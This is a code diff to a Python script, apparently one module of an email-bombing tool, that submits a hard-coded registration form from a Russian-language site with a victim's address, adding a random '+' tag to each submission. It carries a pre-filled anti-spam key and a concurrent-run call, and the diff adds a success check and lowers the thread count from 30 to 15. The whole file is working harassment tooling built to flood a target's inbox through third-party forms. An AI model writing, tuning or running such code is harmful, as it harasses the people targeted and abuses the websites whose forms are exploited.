@@ -33,6 +33,9 @@ headers = {
 
 class ConcreteSpam(Spam):
 
+    def check_success(self, response: requests.Response | None) -> bool:
+        return response.status_code < 500
+
     def post(self, target) -> requests.Response | None:
         data = '------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_1.3"\r\n\r\ntest\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_1.4"\r\n\r\ntest\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_1.6"\r\n\r\ntest\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_2"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_3"\r\n\r\n\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_4"\r\n\r\nN0O60lk8DGhvcFD34\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_4_2"\r\n\r\nN0O60lk8DGhvcFD34\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_4_strength"\r\n\r\nstrong\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_5.1"\r\n\r\n1\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_5.2"\r\n\r\nЯ согласен с <a href="/privacy-policy-reds/">политикой обработки персональных данных</a>.\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_5.3"\r\n\r\n1\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="input_6"\r\n\r\n\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="is_submit_1"\r\n\r\n1\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="gform_submit"\r\n\r\n1\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="gform_unique_id"\r\n\r\n63ea33a380bc1\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="state_1"\r\n\r\nWyJ7XCI1LjFcIjpcImFlNmU3YWMwMjU0YmIwNmU1ODk4ZTIyZWNkYjk2ZGFkXCIsXCI1LjJcIjpcIjM4NTA0YjZkOTYwMjJjYWZjODk0NDk4M2JmZmYyNjg5XCIsXCI1LjNcIjpcImFlNmU3YWMwMjU0YmIwNmU1ODk4ZTIyZWNkYjk2ZGFkXCJ9IiwiMDgyMDc4MWU2ZDRmOTJiMjEwNjZmYTE2Mjg3N2UwNzEiXQ==\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="gform_target_page_number_1"\r\n\r\n0\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="gform_source_page_number_1"\r\n\r\n1\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="gform_field_values"\r\n\r\n\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g\r\nContent-Disposition: form-data; name="gf_zero_spam_key"\r\n\r\np6yXdMTFTtRqPKNC8xOzIJNwlARc2yIqBXNsbN0ejEgV6KDfWkSWL5yoEDYj8GsQ\r\n------WebKitFormBoundary93HlAf6AqmoDmP5g--\r\n'
         target = target.replace('@', f'+{module.generate_text()}@')
@@ -44,10 +47,10 @@ class ConcreteSpam(Spam):
 
 
 def main():
-    spam = ConcreteSpam(basename(__file__)[:-3], 'Спасибо')
+    spam = ConcreteSpam(basename(__file__)[:-3])
     res = spam.send_post()
     if res:
-        spam.run_concurrently(30)
+        spam.run_concurrently(15)
 
 
 if __name__ == '__main__':
